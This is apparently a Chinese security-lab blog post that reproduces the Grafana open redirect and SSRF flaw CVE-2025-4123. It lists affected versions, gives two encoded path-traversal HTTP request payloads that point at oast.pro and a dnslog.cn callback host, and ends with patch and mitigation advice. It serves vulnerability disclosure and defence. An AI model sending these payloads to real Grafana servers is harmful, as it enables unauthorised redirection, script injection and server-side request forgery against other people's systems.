#  【成功复现】Grafana开放重定向&服务端请求伪造漏洞(CVE-2025-4123)   
原创 弥天安全实验室  弥天安全实验室   2025-05-31 15:15  
  
#   
  
网安引领时代，弥天点亮未来    
   
  
  
  
  
  
   
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x00写在前面**  
  
**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x01漏洞介绍**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCX3eXeEoLLKgN8Fk0UnG0Hb2mRyibS5JqDrSnV6VHugw35MJpdP89HKCibDmTtsQ5c9RCdqfWaWicQg/640?wx_fmt=png&from=appmsg "")  
  
Grafana是Grafana开源的一套提供可视化监控界面的开源监控工具。该工具主要用于监控和分析Graphite、InfluxDB和Prometheus等。  
  
Grafana存在安全漏洞，该漏洞源于客户端路径遍历和开放重定向结合，可能导致跨站脚本攻击。  
  
  
注：  
该漏洞允许攻击者通过自定义前端插件将用户重定向到恶意网站，并执行任意 JаvаSсriрt 代码。  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x02影响版本**  
  
  
1、 8.0.0 ≤ grafana <10.4.18  
   
  
2、 11.2.0 ≤ grafana <11.2.9  
   
  
3、 11.3.0 ≤ grafana <11.3.6  
   
  
4、 11.4.0 ≤ grafana <11.4.4  
   
  
5、 11.5.0 ≤ grafana <11.5.4  
   
  
6、 11.6.0 ≤ grafana <11.6.1  
   
  
7、 12.0.0 ≤ grafana <12.0.1   
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCX3eXeEoLLKgN8Fk0UnG0H4J59RE9FU4XmHxlKsh6OlY2phiaFaNNA9Z4BXx9QfSGIXqOsKvnlnbQ/640?wx_fmt=png&from=appmsg "")  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x03漏洞复现**  
  
1.访问漏洞环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCX3eXeEoLLKgN8Fk0UnG0Hiaicd9aFyto4eEsI5Qv21AFiabibwN8JmR03ibGlib9N1b32DmSrdLjkvIag/640?wx_fmt=png&from=appmsg "")  
  
2.对漏洞进行复现  
  
   
**POC**  
  
漏洞复现  
  
1.开放重定向  
```
GET /public/..%2F%5coast.pro%2F%3f%2F..%2F.. HTTP/1.1
Host: 127.0.0.1:8080
```  
  
通过响应判断漏洞存在  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCX3eXeEoLLKgN8Fk0UnG0Huy9ZZoGdTiayCtGLhk7icPSarDm7nfPdZvmybHavvuk1XwuGDpRicGomw/640?wx_fmt=png&from=appmsg "")  
  
  
2.  
服务端请求伪造  
```
GET /render/public/..%252f%255Ckvc1mh.dnslog.cn%252f%253F%252f..%252f.. HTTP/1.1
Host: 127.0.0.1:8080
```  
  
     通过dnslog回显判断漏洞存在  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCX3eXeEoLLKgN8Fk0UnG0HaUBqvtKYsm5AMy8IqImylks4XRibAIk2QJkGMDYD3EKKt20UOouomKA/640?wx_fmt=png&from=appmsg "")  
  
  
3.Yakit插件  
测试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCX3eXeEoLLKgN8Fk0UnG0HxaPAK4ux8tW2rnLvaViaVS0kBx663Sd9wuD6ic0eXTVeFIrsT1JztaEw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x04修复建议**  
  
  
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：  
## 临时缓解措施：  
  
1、添加默认内容安全策略配置。具体操作可参考：  
  
https://grafana.com/docs/grafana/latest/setup-grafana/configure-security/configure-security-hardening/#add-a-content-security-policy  
  
2、禁用Grafana 图像渲染器插件  
  
3、禁用匿名访问：在 grafana.ini 文件中设置 [auth.anonymous] enabled = false  
  
  
建议尽快升级修复漏洞，再次声明本文仅供学习使用，非法他用责任自负！    
```
https://grafana.com/security/security-advisories/cve-2025-4123/
https://grafana.com/blog/2025/05/21/grafana-security-release-high-severity-security-fix-for-cve-2025-4123/
```  
  
     
  
  
  
弥天简介  
  
学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。  
  
口号 网安引领时代，弥天点亮未来  
  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
   
  
  
知识分享完了  
  
喜欢别忘了关注我们哦~  
  
学海浩茫，  
  
予以风动，  
  
必降弥天之润！  
  
   弥  天  
  
安全实验室  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
